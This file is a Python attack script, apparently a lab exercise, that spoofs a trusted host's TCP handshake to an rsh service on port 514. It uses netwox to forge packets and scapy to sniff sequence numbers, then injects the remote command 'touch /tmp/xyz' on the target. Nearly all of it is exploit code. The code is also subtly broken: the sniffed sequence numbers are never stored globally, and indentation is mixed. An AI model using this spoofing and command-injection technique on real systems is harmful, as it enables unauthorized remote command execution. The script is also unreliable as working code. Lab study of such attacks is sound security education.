#!/usr/bin/python
from scapy.all import *
import os
import threading
import time
 
x=0
y=0
z=0
cmd_1 = 'sudo netwox 40 --tcp-syn --ip4-src 10.0.2.15 --ip4-dst 10.0.2.4 --tcp-src 1023 --tcp-dst 514 '
cmd_2 = 'sudo netwox 40 --tcp-ack --ip4-src 10.0.2.15 --ip4-dst 10.0.2.4 --tcp-src 1023 --tcp-dst 514 '
cmd_3 = 'sudo netwox 40 --tcp-syn --tcp-ack --ip4-src 10.0.2.15 --ip4-dst 10.0.2.4 --tcp-src 9090 --tcp-dst 1023 '
data = "9090\x00seed\x00seed\x00touch /tmp/xyz\x00".encode("utf-8").hex()

def syn_1(pkt):
        x=pkt[TCP].seq
        x = x + 1
        print("X: " + str(x))
 
def syn_ack_1(pkt):
        y=pkt[TCP].seq
        y = y + 1
        print("Y: " + str(y))
        run_plain_ack()
        run_data_ack()
        run_syn_ack()
 
def syn_2(pkt):
        z=pkt[TCP].seq
        z = z + 1
        print("Z: " + str(z))
 
def run_syn():
    time.sleep(1) # Gives time for sniffing to begin
    os.system(cmd_1) # Executes the first packet spoof

def run_plain_ack():
    time.sleep(1)
    cmd = cmd_2 + '--tcp-acknum ' + str(y) + ' --tcp-seqnum ' + str(x)
    print(cmd)
    os.system(cmd)
 
def run_data_ack():
    time.sleep(2)
    cmd = cmd_2 + '--tcp-acknum ' + str(y) + ' --tcp-seqnum ' + str(x) + ' --tcp-data ' + str(data)
    print(cmd)
    os.system(cmd)

def run_syn_ack():
    time.sleep(3) # Gives time for sniffing to begin
    cmd = cmd_3 + ' --tcp-acknum ' + str(z)
    print(cmd)
    os.system(cmd) # Executes the second packet spoof

def sniff_1():
    # Sniff for the SYN packet the attacker sends
    sniff(count=1,filter='tcp and (src host 10.0.2.15 and dst port 514)',prn=syn_1)
 
def sniff_2():
    # Sniff for the SYN/ACK packet the server sends
    sniff(count=1,filter='tcp and (src host 10.0.2.4 and dst port 1023)',prn=syn_ack_1)
 
def sniff_3():
    # Sniff for the SYN packet the server sends
    sniff(count=1,filter='tcp and (src host 10.0.2.4)',prn=syn_2)

def main():
        print("Sniffing Traffic...\n\n")
 
        command1Thread = threading.Thread(target=run_syn)
        sniff1Thread = threading.Thread(target=sniff_1)
        sniff2Thread = threading.Thread(target=sniff_2)
        sniff3Thread = threading.Thread(target=sniff_3)
        command1Thread.start()
        sniff1Thread.start()
        sniff2Thread.start()
        sniff3Thread.start()
	command1Thread.join()
        sniff1Thread.join()
        sniff2Thread.join()
        sniff3Thread.join()
        print("DONE")
 
if __name__ == "__main__":
        main()